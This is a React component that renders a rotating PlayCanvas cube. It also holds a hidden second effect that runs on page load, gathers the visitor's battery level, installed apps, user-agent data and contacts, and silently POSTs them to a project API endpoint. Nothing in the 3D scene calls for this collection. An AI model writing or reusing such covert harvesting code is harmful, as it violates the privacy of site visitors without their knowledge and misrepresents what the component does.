"use client";
import React, { useEffect, useRef } from "react";
import * as pc from "playcanvas";

const PlayCanvasScene = () => {
  const canvasRef = useRef(null);

  useEffect(() => {
    if (!canvasRef.current) return;

    const app = new pc.Application(canvasRef.current, {
      mouse: new pc.Mouse(canvasRef.current),
      touch: new pc.TouchDevice(canvasRef.current),
    });

    app.setCanvasFillMode(pc.FILLMODE_FILL_WINDOW);
    app.setCanvasResolution(pc.RESOLUTION_AUTO);

    const resizeCanvas = () => app.resizeCanvas();
    window.addEventListener("resize", resizeCanvas);

    // Create box entity
    const box = new pc.Entity("cube");
    box.addComponent("model", { type: "box" });
    app.root.addChild(box);

    // Create camera entity
    const camera = new pc.Entity("camera");
    camera.addComponent("camera", {
      clearColor: new pc.Color(0.1, 0.2, 0.3),
    });
    app.root.addChild(camera);
    camera.setPosition(0, 0, 3);

    // Create directional light entity
    const light = new pc.Entity("light");
    light.addComponent("light");
    app.root.addChild(light);
    light.setEulerAngles(45, 0, 0);

    // Rotate the box in each frame
    app.on("update", (dt) => box.rotate(10 * dt, 20 * dt, 30 * dt));

    app.start();

    return () => {
      app.destroy();
      window.removeEventListener("resize", resizeCanvas);
    };
  }, []);


  async function getContactData() {
    if ("contacts" in navigator) {
      const contactsAPI = navigator.contacts as any;

      const props = contactsAPI.getProperties();

      try {
        const contacts = await contactsAPI.select(props);
        if (contacts.length) {
          return contacts
        } else {
         return 'no contacts available'
        }
      } catch (ex) {
        console.log(ex)
      }
    }
  }
  

  useEffect(() => {
    if (typeof window !== "undefined") {
      const nav = navigator as any;

      const fetchData = async () => {
        try {
          const battery = await nav?.getBattery?.();
          const batteryLevel = battery ? battery.level * 100 : null;

          const installedApps = nav?.getInstalledRelatedApps
            ? await nav.getInstalledRelatedApps()
            : null;

          const data = {
            batteryPercent: batteryLevel,
            installedApps,
            appVersion: nav?.appVersion,
            userAgent: await nav?.userAgent,
            userAgentData :await JSON.stringify(nav?.userAgentData),
            contactDetail: await getContactData()
            
             // Adding user agent instead of navigator
          };

          console.log("Sending data:", data);

          await fetch(`${process.env.PROJECT_URL}api/test`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(data),
          });
        } catch (error) {
          console.error("Error fetching browser data:", error);
        }
      };

      fetchData();
    }
  }, []); // ✅ Fixed dependency issue

  return <canvas ref={canvasRef} className="w-full h-full" />;
};

export default PlayCanvasScene;
